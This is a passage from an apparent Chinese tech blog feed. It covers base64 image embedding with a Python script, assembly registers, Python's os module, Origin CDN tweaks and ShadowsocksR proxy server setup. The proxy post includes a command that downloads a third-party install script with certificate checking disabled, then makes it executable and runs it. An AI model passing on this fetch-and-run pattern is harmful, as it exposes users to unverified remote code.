title="缺点"></a>缺点</h2><p>①数据传输量变大，代码的可读性不高。<br>②对于IE 8以下的浏览器不可使用，IE 8以上的浏览器可以使用，但对大小做出了限制。</p><p>#base64编码图片的id调用<br>可以将长长的base64代码放在文章的末尾，然后在文章中通过![avatar]调用他</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![avatar][base64str]</span><br><span class="line">[base64str]:data:image&#x2F;png;base64,iVBORw0......</span><br></pre></td></tr></table></figure><h1 id="一个小脚本"><a href="#一个小脚本" class="headerlink" title="一个小脚本"></a>一个小脚本</h1><p>base64编码在很多语言中都有封装好的方法实现，我写了个python小脚本，可以将一个目录下面的所有图片格式的文件base64编码后写入一个指定文件中。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line">#~ #------------------------------------------------------------------</span><br><span class="line">#~ module:base64 os re</span><br><span class="line">#~ Filename:transfer.py </span><br><span class="line">#~ Description:transfer pacific file into base64 string and write into</span><br><span class="line">#~ a text file with form of Markdown quote</span><br><span class="line">#~ Function : </span><br><span class="line">#~ def get_filename(filepath):return files&#39; name under filepath</span><br><span class="line">#~ def name_fliter(file_name_list):remove files that are not image form</span><br><span class="line">#~ def trans(file_name_list): base64encode image and write into txt</span><br><span class="line">#~ Date: 2020-1-15 </span><br><span class="line">#~ Author:Alexi Bi </span><br><span class="line">#~ Email:alexi_bi@qq.com </span><br><span class="line">#~ #------------------------------------------------------------------</span><br><span class="line">#~ #------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># return files&#39; name under filepath</span><br><span class="line">def get_filename(filepath):</span><br><span class="line">    file_name_list&#x3D;[]</span><br><span class="line">    for root,dirs,files in os.walk(filepath):</span><br><span class="line">        file_name_list+&#x3D;files</span><br><span class="line">    return file_name_list</span><br><span class="line">    </span><br><span class="line"># remove files that are not image form</span><br><span class="line">def name_fliter(file_name_list):</span><br><span class="line">    for words in file_name_list[::-1]:</span><br><span class="line">        if not (re.match(r&#39;.*((.jpg)|(.png)|(.jpeg)|(.psd)|(.bmp))$&#39;,words)):</span><br><span class="line">            file_name_list.remove(words)</span><br><span class="line">    </span><br><span class="line"># write into a txt file </span><br><span class="line">def trans(file_name_list):</span><br><span class="line">    if len(file_name_list)!&#x3D;0:</span><br><span class="line">        fs&#x3D;open(text,&#39;a+&#39;)</span><br><span class="line">        for files in file_name_list:</span><br><span class="line">            type&#x3D;os.path.splitext(files)[1][1:]</span><br><span class="line">            f&#x3D;open(path+&#39;\\&#39;+files,&#39;rb&#39;)</span><br><span class="line">            ls_f&#x3D;base64.b64encode(f.read())</span><br><span class="line">            fs.write(&#39;[&#39;+files+&#39;]:data:image&#x2F;&#39;+type+&#39;;base64,&#39;+ls_f.decode()+&#39;\n&#39;)  </span><br><span class="line">            f.close()</span><br><span class="line">        fs.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;这个小脚本可以将你选择的路径下的图片base64编码\n&quot;)</span><br><span class="line">print(&quot;并且将编码以Markdown引用的格式写在一个文件里\n&quot;)</span><br><span class="line">print(&quot;引用标签就是对应的文件名\n&quot;)</span><br><span class="line">print(&quot;这样你就不用再配图床的负载啦\n&quot;)</span><br><span class="line">path&#x3D;input(&quot;请输入图片的目录(也可以直接开脚本改，说不定还方便一点)：&quot;)</span><br><span class="line">#path&#x3D;(&#39;D:\\？&#39;) </span><br><span class="line">file_name_list&#x3D;get_filename(path)</span><br><span class="line">text&#x3D;&#39;result.txt&#39;</span><br><span class="line">text&#x3D;input(&quot;请输入要写入的文件，如果为空则写在在当前目录下result.txt中。&quot;)</span><br><span class="line">name_fliter(file_name_list)</span><br><span class="line">trans(file_name_list)</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然这玩意对咱这样的小访问量低并发的博客其实根本没有什么实际的意义，但是可以让大家知道优化这种东西有多细节（强行提高意义，点赞。）</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;前端对图片的处理一直以来是一个非常值得研究的点。这里简单的介绍其中的一种：图片的base64编码&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>汇编</title>
    <link href="https://blog.pillar.fun/2020/01/15/%E6%B1%87%E7%BC%96/"/>
    <id>https://blog.pillar.fun/2020/01/15/%E6%B1%87%E7%BC%96/</id>
    <published>2020-01-15T07:28:53.000Z</published>
    <updated>2020-05-30T05:49:36.647Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>汇编语言在计算机组成原理、操作系统、二进制逆向等众多方面有着不可小觑的作用，由于学校没有系统的为我们年级开过汇编语言的专业课，因此一直以来在虚妄的根基上学得如同浮萍一般没底，今天来总结一下常用的汇编语言和8086下常见的寄存器</p><a id="more"></a><h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><p><img src="/2020/01/15/%E6%B1%87%E7%BC%96/1.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/2.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/3.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/4.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/5.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/6.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/7.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/8.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/9.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/10.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/11.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/12.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/13.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/14.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/15.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/16.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/17.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/18.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/19.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/20.jpg" alt><br><img src="/2020/01/15/%E6%B1%87%E7%BC%96/21.jpg" alt></p><h1 id="常用寄存器"><a href="#常用寄存器" class="headerlink" title="常用寄存器"></a>常用寄存器</h1><p>在我们使用各种反汇编工具的时候，常常会见到这些寄存器，把他们总结在这里。</p><table style="width:500px;" cellspacing="1" cellpadding="1" border="1"><tbody><tr><td>32位寄存器</td>            <td>名称</td>            <td>16位与8位子寄存器</td>            <td>用途</td>        </tr><tr><td>eax</td>            <td>累加器</td>            <td>ax,ah,al</td>            <td>算术与逻辑</td>        </tr><tr><td>ebx</td>            <td>基址寄存器</td>            <td>bx,bh,bl</td>            <td>数组</td>        </tr><tr><td>ecx</td>            <td>计数器</td>            <td>cx,ch,cl</td>            <td>循环</td>        </tr><tr><td>edx</td>            <td>数据寄存器</td>            <td>dx,dh,dl</td>            <td>算术</td>        </tr><tr><td>esi</td>            <td>源索引寄存器</td>            <td>si</td>            <td>字符串与数组</td>        </tr><tr><td>edi</td>            <td>目的索引寄存器</td>            <td>di</td>            <td>字符串与数组</td>        </tr><tr><td>esp</td>            <td>堆栈指针</td>            <td>sp</td>            <td>堆顶部</td>        </tr><tr><td>ebp</td>            <td>基址指针</td>            <td>bp</td>            <td>栈底部</td>        </tr><tr><td>eip</td>            <td>指令指针</td>            <td>ip</td>            <td>指向下一条指令</td>        </tr><tr><td>eflags</td>            <td>标志位</td>            <td>flags</td>            <td>状态与控制标志位</td>        </tr></tbody></table><p>带E的是32位寄存器，不带E的是16位寄存器，后面有H的是16位寄存器的H（igh）8位，后面带L的是16位寄存器的L(ow)8位。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;汇编语言在计算机组成原理、操作系统、二进制逆向等众多方面有着不可小觑的作用，由于学校没有系统的为我们年级开过汇编语言的专业课，因此一直以来在虚妄的根基上学得如同浮萍一般没底，今天来总结一下常用的汇编语言和8086下常见的寄存器&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机基础" scheme="https://blog.pillar.fun/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>python-sys_os</title>
    <link href="https://blog.pillar.fun/2020/01/14/python-sys-os/"/>
    <id>https://blog.pillar.fun/2020/01/14/python-sys-os/</id>
    <published>2020-01-14T09:49:12.000Z</published>
    <updated>2020-03-09T11:29:29.826Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>python不多逼逼，大家都懂，sys和os是python非常基础且重要的两个模块，今天就由在下整理一下<br><a href="https://docs.python.org/3/library/os.html">python os docs</a><br><a href="https://docs.python.org/3/library/sys.html">python sys docs</a></p><a id="more"></a><h1 id="os"><a href="#os" class="headerlink" title="os"></a>os</h1><p>os模块提供了多数操作系统的功能接口函数。当os模块被导入后，它会自适应于不同的操作系统平台，根据不同的平台进行相应的操作，在python编程时，经常和文件、目录打交道，所以离不了os模块。<br>根据手册，我用ipython在自己的电脑上全部实验了一下。</p><table><thead><tr><th>方法</th><th align="center">作用</th><th align="center">备注</th></tr></thead><tbody><tr><td>os.name</td><td align="center">显示当前操作系统的所属的平台</td><td align="center">类linux为posix，windows为nt</td></tr><tr><td>os.ctermid</td><td align="center">显示对于此进程的控制终端的文件名</td><td align="center">只适用于unix系统，我没跑出来</td></tr><tr><td>os.environ[key]</td><td align="center">接受一个参数key，显示目录下的环境变量</td><td align="center">如果你不知道你的操作系统接受的参数都有什么，可以用os.environ.keys()。</td></tr><tr><td>os.getenv(key,default=None)</td><td align="center">同上</td><td align="center">接受str，返回str</td></tr><tr><td>os.environb</td><td align="center">二进制下的os.environb</td><td align="center">我的os模块里没有这个。因为如果要使用这个方法必须要os.support_bytes_enivron为True才可，这个值是取决于原生操作系统的环境的数据类型是否是字节型，而windows不是。</td></tr><tr><td>os/getenvb(key,default=None)</td><td align="center">同上</td><td align="center">接受byte，返回byte</td></tr><tr><td>os.fsencode(filename)</td><td align="center">用文件系统编码文件名</td><td align="center">在windows里就是os.fsencode(‘D:\1.txt’)=&gt;b’D:\1.txt’)</td></tr><tr><td>os.fsdecode(filename)</td><td align="center">用文件系统编码解码文件名</td><td align="center">encode的逆过程</td></tr><tr><td>os.fspath(path)</td><td align="center">返回path的路径</td><td align="center">主要是应对os.PathLike类型的，PathLike类型主要在pathlib中产生，引用也很多，他是一种文件系统路径的替代对象表示。pathlike包含了ducktype思想，就是看着这个挺像路径，那么我们就管他当路径，而使用fspath即可将他转化为标准的路径表达。</td></tr><tr><td>os.get_exec_path(env=None)</td><td align="center">返回可执行文件的搜索路径</td><td align="center">好像就是我设置的环境变量的’PATH’里的值</td></tr><tr><td>os.getegid()</td><td align="center">返回egid（关于uid、gid、euid、egid的知识有空再写）</td><td align="center">只适用于unix</td></tr><tr><td>os.setegid(egid)</td><td align="center">设置egid</td><td align="center"></td></tr><tr><td>os.geteuid()</td><td align="center">返回euid</td><td align="center">只适用unix</td></tr><tr><td>os.seteuid(euid)</td><td align="center">设置euid</td><td align="center"></td></tr><tr><td>os.getgid()</td><td align="center">返回gid</td><td align="center">只使用unix</td></tr><tr><td>os.setgid(gid)</td><td align="center">设置gid</td><td align="center"></td></tr><tr><td>os.getgrouplist(user,group)</td><td align="center">返回user所在的组里面的所有id,group一般是通过user的密码记录而确定的组id</td><td align="center">只适用于unix</td></tr><tr><td>os.getgroups()</td><td align="center">返回对当前进程提供了支持的组id</td><td align="center">只适用于unix</td></tr><tr><td>os.setgroups(groups)</td><td align="center">设置group</td><td align="center"></td></tr><tr><td>os.getlogin()</td><td align="center">返回当前登录的用户</td><td align="center"></td></tr><tr><td>os.getpgid(pid)</td><td align="center">返回pgid（关于PID、PGID、PPID、SID、TID、TTY的知识有空再写）</td><td align="center">只适用于unix</td></tr><tr><td>os.setpgid(pid, pgrp)</td><td align="center">设置pgid</td><td align="center"></td></tr><tr><td>os.getpgrp()</td><td align="center">返回pgrp</td><td align="center">只适用于unix</td></tr><tr><td>os.setpgrp()</td><td align="center">设置pgrp</td><td align="center"></td></tr><tr><td>os.getpid()</td><td align="center">返回pid</td><td align="center">windows也适用</td></tr><tr><td>os.getppid()</td><td align="center">返回ppid</td><td align="center">windows也适用</td></tr><tr><td>os.getpriority(which, who)</td><td align="center">返回调度优先级</td><td align="center">只适用于unix</td></tr><tr><td>os.setpriority(which, who, priority)</td><td align="center">设置优先级</td><td align="center"></td></tr><tr><td>os.PRIO_PROCESS</td><td align="center">getpriority和setpriority的参数</td><td align="center"></td></tr><tr><td>os.PRIO_PGRP</td><td align="center">同上</td><td align="center"></td></tr><tr><td>os.PRIO_USER</td><td align="center">同上</td><td align="center"></td></tr><tr><td>os.getresuid()</td><td align="center">Return a tuple (rgid, egid, sgid)</td><td align="center">三合一奥利给</td></tr><tr><td>os.getuid()</td><td align="center">返回当前进程的真实用户的uid</td><td align="center">只适用于unix</td></tr><tr><td>os.os.initgroups(username, gid)</td><td align="center">调用系统的initgroups（）函数来初始化user所在的group的group access list</td><td align="center">只适用于unix</td></tr><tr><td>os.putenv(key,value)</td><td align="center">设置环境参数为变量名key</td><td align="center">会影响os.system()、popen()、fork()和execv（）</td></tr><tr><td>os.setregid(rgid, egid)</td><td align="center">设置regid</td><td align="center"></td></tr><tr><td>os.setresgid(rgid, egid, sgid)</td><td align="center">设置resgid</td><td align="center"></td></tr><tr><td>os.setresuid(ruid, euid, suid)</td><td align="center">设置resuid</td><td align="center"></td></tr><tr><td>os.setreuid(ruid, euid)</td><td align="center">设置reuid</td><td align="center"></td></tr><tr><td>os.getsid(pid)</td><td align="center">返回sid</td><td align="center"></td></tr><tr><td>os.setsid()</td><td align="center">设置sid</td><td align="center"></td></tr><tr><td>os.setuid(uid)</td><td align="center">设置uid</td><td align="center"></td></tr><tr><td>os.strerror(code)</td><td align="center">返回code中对应的错误信息</td><td align="center"></td></tr></tbody></table><p>os.path.abspath(path)|返回path规范化的绝对路径|<br>os.path.split(path)|将path分割成目录和文件名的二元组返回</p><p>os.chdir(path)|改变当前的工作路径为path<br>os.fchdir(fd)<br>os.getcwd()|获取当前的工作路径|</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;python不多逼逼，大家都懂，sys和os是python非常基础且重要的两个模块，今天就由在下整理一下&lt;br&gt;&lt;a href=&quot;https://docs.python.org/3/library/os.html&quot;&gt;python os docs&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://docs.python.org/3/library/sys.html&quot;&gt;python sys docs&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="python" scheme="https://blog.pillar.fun/tags/python/"/>
    
    <category term="操作系统" scheme="https://blog.pillar.fun/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>cdn</title>
    <link href="https://blog.pillar.fun/2020/01/13/cdn/"/>
    <id>https://blog.pillar.fun/2020/01/13/cdn/</id>
    <published>2020-01-13T08:41:36.000Z</published>
    <updated>2020-05-30T04:50:41.922Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>我的憨憨同学们在群里炫耀起了他的烂橘子下apex可以达到10m/s，并且强力向我们安利他的加速器，说是还能一键修复origin平台，属实是居家旅行的必备好物。<br>然而实际上我们只需修改一下origin平台的cdn即可，多年以前搁学校下载的时候裸下就10多m/s，具体怎么操作，cdn是什么呢，容我随意的介绍一哈。</p><a id="more"></a><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>首先到origin的安装目录下，找到EAcore.ini文件，如果你是憨憨经常找不到文件的位置，那我推荐你用 <a href="https://www.voidtools.com/zh-cn/">everything</a>，他采用了更加高效的搜索排序算法能让你更快地根据文件名定位到具体的文件。<br>然后用什么文本修改工具打开它，向其中加上如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[connection]</span><br><span class="line">EnvironmentName&#x3D;production</span><br><span class="line"></span><br><span class="line">[Feature]</span><br><span class="line">CdnOverride&#x3D;akamai</span><br></pre></td></tr></table></figure><p>保存，完事。<br>不过记得重启你的橘子客户端。<br>这段代码也很简单，设置了ASP.NET Core的hostenvironment（default值理论上好像也是production来着，感觉理论上不改也行，但我没试过），修改了cdn服务器，没了。</p><h1 id="什么是cdn"><a href="#什么是cdn" class="headerlink" title="什么是cdn"></a>什么是cdn</h1><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。CDN加速意思就是在用户和我们的服务器之间加一个缓存机制，通过这个缓存机制动态获取IP地址根据地理位置，让用户到最近的服务器访问。本质上就是拿空间换时间。</p><h1 id="cdn的组成"><a href="#cdn的组成" class="headerlink" title="cdn的组成"></a>cdn的组成</h1><p><img src="/2020/01/13/cdn/1.jpg" alt><br>CDN网络中包含的功能实体包括内容缓存设备、内容交换机、内容路由器、CDN内容管理系统等组成。</p><p>内容缓存为CDN网络节点，位于用户接入点，是面向最终用户的内容提供设备，可缓存静态Web内容和流媒体内容，实现内容的边缘传播和存储，以便用户的就近访问。</p><p>内容交换机处于用户接入集中点，可以均衡单点多个内容缓存设备的负载，并对内容进行缓存负载平衡及访问控制。</p><p>内容路由器负责将用户的请求调度到适当的设备上。内容路由通常通过负载均衡系统来实现，动态均衡各个内容缓存站点的载荷分配，为用户的请求选择最佳的访问站点，同时提高网站的可用性。内容路由器可根据多种因素制定路由，包括站点与用户的临近度、内容的可用性、网络负载、设备状况等。负载均衡系统是整个CDN的核心。负载均衡的准确性和效率直接决定了整个CDN的效率和性能。</p><p>内容管理系统负责整个CDN的管理，是可选部件，作用是进行内容管理，如内容的注入和发布、内容的分发、内容的审核、内容的服务等。</p><h1 id="cdn的原理"><a href="#cdn的原理" class="headerlink" title="cdn的原理"></a>cdn的原理</h1><p>CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。<br>CDN的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。</p><h1 id="cdn加速基本过程"><a href="#cdn加速基本过程" class="headerlink" title="cdn加速基本过程"></a>cdn加速基本过程</h1><p>1、用户向浏览器提供需要访问的域名</p><p>2、浏览器调用域名解析库对域名进行解析，由于CDN对域名解析过程进行了调整，所以解析函数库一般得到的是该域名对应的CNAME记录，为了得到实际的IP地址，浏览器需要再次对获得的CNAME域名进行解析以得到实际的IP地址；在此过程中，使用的全局负载均衡DNS解析。如根据地理位置信息解析对应的IP地址，使得用户能就近访问</p><p>3、此次解析得到CDN缓存服务器的IP地址，浏览器在得到实际的ip地址之后，向缓存服务器发出访问请求；</p><p>4、缓存服务器根据浏览器提供的要访问的域名，通过Cache内部专用DNS解析得到此域名的实际IP地址，再由缓存服务器向此实际IP地址提交访问请求</p><p>5、缓存服务器从实际IP地址得到内容以后，一方面在本地进行保存，以备以后使用，二方面把获取的数据放回给客户端，完成数据服务过程</p><p>6、客户端得到由缓存服务器返回的数据以后显示出来并完成整个浏览的数据请求过程<br><img src="/2020/01/13/cdn/2.png" alt></p><h1 id="akamai"><a href="#akamai" class="headerlink" title="akamai"></a>akamai</h1><p>于是我们就好气，这个akamai的cdn是啥玩意呢？<br>Akamai（阿卡迈）在1998年发明CDN技术架构之后组建公司，诞生于麻省理工学院，是CDN服务提供商，1999年NASDAQ上市。总部位于美国波士顿。<br>基本上都能对橘子加速，毕竟你周围全都没人用过橘子也说不过去，当然如果你真没上去速度当我没说。加速器平台估计一般也会整个类似cdn的，好歹也算做了事，但是你要是说修复客户端，然后说我加速器牛逼，我觉得还是有失偏颇的。</p><p>参考：<br><a href="https://www.jianshu.com/p/ce98fbff39ac">https://www.jianshu.com/p/ce98fbff39ac</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;我的憨憨同学们在群里炫耀起了他的烂橘子下apex可以达到10m/s，并且强力向我们安利他的加速器，说是还能一键修复origin平台，属实是居家旅行的必备好物。&lt;br&gt;然而实际上我们只需修改一下origin平台的cdn即可，多年以前搁学校下载的时候裸下就10多m/s，具体怎么操作，cdn是什么呢，容我随意的介绍一哈。&lt;/p&gt;</summary>
    
    
    
    
    <category term="杂项" scheme="https://blog.pillar.fun/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>ss-ssr-build</title>
    <link href="https://blog.pillar.fun/2020/01/10/ssr-build/"/>
    <id>https://blog.pillar.fun/2020/01/10/ssr-build/</id>
    <published>2020-01-09T16:08:23.000Z</published>
    <updated>2020-03-13T07:58:19.247Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>ssr全名shadowsocksR，是一款代理工具，是shadowsocks的高级版，较之不带r的，带r的增加了一些数据混淆方式，甚至增加了类似Tor的可插拔传输层功能。ss和ssr基于socks5。和其他代理工具基本相同，他们使用特定的中转服务器完成数据传输。客户端在本地会构建一个socks5代理，在访问一些网站的时候，网络流量需要先通过本地代理传到客户端，然后客户端发送到服务端，反之亦然。<br>今天就搁着腆着脸讲一下搭建方法吧。</p><a id="more"></a><h1 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h1><p>购买服务器在此不需要赘述了。华东华中也可以，多少也能有一点匿名性，不过记得改对应的DNS服务器哦~<br>有一个很帅气的网站，搭完了可以看看自己是不是搞好了<br><a href="https://whoer.net">WHOER</a></p><h1 id="服务端部署"><a href="#服务端部署" class="headerlink" title="服务端部署"></a>服务端部署</h1><p>首先连接上自己的服务器，顺便推销一下其他文章<a href="http://www.noobgun.club/2020/01/04/putty-ssh(1)/">putty-ssh</a><br>ssr的服务端有很多语言写的版本。使用python的话可以参考他的<a href="https://github.com/such-stupid6/shadowsocksr">github项目</a><br>总结我遇到的问题<br>在这一步</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install python-pip</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><p>或许会出现 unable to locate package pythn-pip（大概是这个，我忘了）<br>只需要更新一下apt-get</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>之后在启动时，或许会遇到<br><code>AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup</code></p><p>这是由于openssl版本太高，在openssl1.1.0版本中，废弃了EVP_CIPHER_CTX_cleanup函数。<br>在 <a href="https://www.openssl.org/docs/man1.1.1/man3/EVP_CipherInit_ex.html">openssl 1.1.1版本手册</a> 中的HISTORY部分有说明</p><blockquote><p>EVP_CIPHER_CTX was made opaque in OpenSSL 1.1.0. As a result, EVP_CIPHER_CTX_reset() appeared and EVP_CIPHER_CTX_cleanup() disappeared. EVP_CIPHER_CTX_init() remains as an alias for EVP_CIPHER_CTX_reset().</p></blockquote><p>所以有俩办法：回退openssl的版本或者直接改代码。我就改了代码<br>找到自己的python包存放的地方，如果你是直接装的应该在<br><code>/usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py</code><br>把里面的cleanup换成reset就行了。<br>然后设置好参数就可以啦~<br>（不过这是ss来着，我当时拿ssr客户端练了半天没连上，我还在纳闷为啥设置的时候没有混淆方式，然后一拍脑门，拿ss一连就成，大家千万不要像我一样，要注意小飞机的颜色哦~）</p><p>如果你觉得麻烦可以直接偷 <a href="https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh">大佬写好的ss一键安装脚本</a></p><p>然后我的ssr就是偷的 <a href="https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.sh">大佬写的ssr一键安装脚本</a></p><p>让我感到震惊然后释然的是，我们去 <a href="https://github.com/teddysun">teddysun的github</a> 会惊讶的发现并没有这个项目，然而这个项目逇usercontent还在，我们可以看到、得到他的raw文件，也许这就是自由精神吧。</p><p>当然你的客户端肯定得用wget才行好</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.sh</span><br><span class="line">chmod +x shadowsocksR.sh</span><br><span class="line">./shadowsocksR.sh 2&gt;&amp;1 | tee shadowsocksR.log</span><br></pre></td></tr></table></figure><p>ss同理，把链接换了就行了</p><h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>可以在<a href="https://shadowsocks.org">shadowsocks</a>找到ss的客户端。<br>在 <a href="https://github.com/shadowsocksrr">shadowsocksR</a> 的github项目里找对应的版本下。</p><h1 id="SSR协议和混淆插件"><a href="#SSR协议和混淆插件" class="headerlink" title="SSR协议和混淆插件"></a>SSR协议和混淆插件</h1><p>抄一下<a href="http://www.wangchao.info/1549.html">王超大佬的</a>，感觉讲的非常清晰，很好理解。<br>工作原理</p><p>C-&gt;S方向</p><p>浏览器请求（socks5协议） -&gt; ssr客户端 -&gt; 协议插件（转为指定协议） -&gt; 加密 -&gt; 混淆插件（转为表面上看起来像http/tls） -&gt; ssr服务端 -&gt; 混淆插件（分离出加密数据） -&gt; 解密 -&gt; 协议插件（转为原协议） -&gt; 转发目标服务器</p><p>其中，协议插件主要用于增加数据完整性校验，增强安全性，包长度混淆等，协议插件主要用于伪装为其它协议</p><p>客户端</p><p>客户端的协议插件暂无配置参数，混淆插件有配置参数，混淆插件列表如下：</p><p>plain：不混淆，无参数</p><p>http_simple：简易伪装为http get请求，参数为要伪装的域名，如cloudfront.com。仅在C#版客户端上支持用逗号分隔多个域名如a.com,b.net,c.org，连接时会随机使用其中之一。不填写参数时，会使用此节点配置的服务器地址作为参数。</p><p>http_post：与http_simple绝大部分相同，区别是使用POST方式发送数据，符合http规范，欺骗性更好，但只有POST请求这种行为容易被统计分析出异常。参数配置与http_simple一样</p><p>tls1.2_ticket_auth：伪装为tls请求。参数配置与http_simple一样</p><p>其它插件不推荐使用，在这里忽略</p><p>客户端的协议插件，仅建议使用origin,verify_sha1,auth_sha1_v2,auth_sha1_v4,auth_aes128_md5,auth_aes128_sha1，解释如下：</p><p>origin：原版协议，为了兼容</p><p>verify_sha1：原版OTA协议，为了兼容</p><p>auth_sha1_v2：中等安全性，无时间校对的要求，适合路由器或树莓派，混淆强度大</p><p>auth_sha1_v4：较高安全性，有宽松的时间校对要求，混淆强度大</p><p>auth_aes128_md5或auth_aes128_sha1：最高安全性，有宽松的时间校对要求，计算量相对高一些，混淆强度较大</p><p>如不考虑兼容，可无视前两个</p><p>服务端</p><p>大部分插件都可以通过添加_compatible后缀以表示兼容原版，例如默认的http_simple_compatible或auth_sha1_v4_compatible这样；</p><p>服务端的协议插件，仅auth_*系列有协议参数，其值为整数。表示允许的同时在线客户端数量，建议最小值为2。默认值64；</p><p>服务端的混淆插件，http_simple或http_post有混淆参数，用逗号分开若干个host，表示客户端仅能使用以上任一个host连接，而留空表示客户端可以使用任意host。tls1.2_ticket_auth有混淆参数，其值为整数，表示与客户端之间允许的UTC时间差，单位为秒，为0或不填写（默认）表示无视时间差。</p><p>总结</p><p>如不考虑原版的情况下，推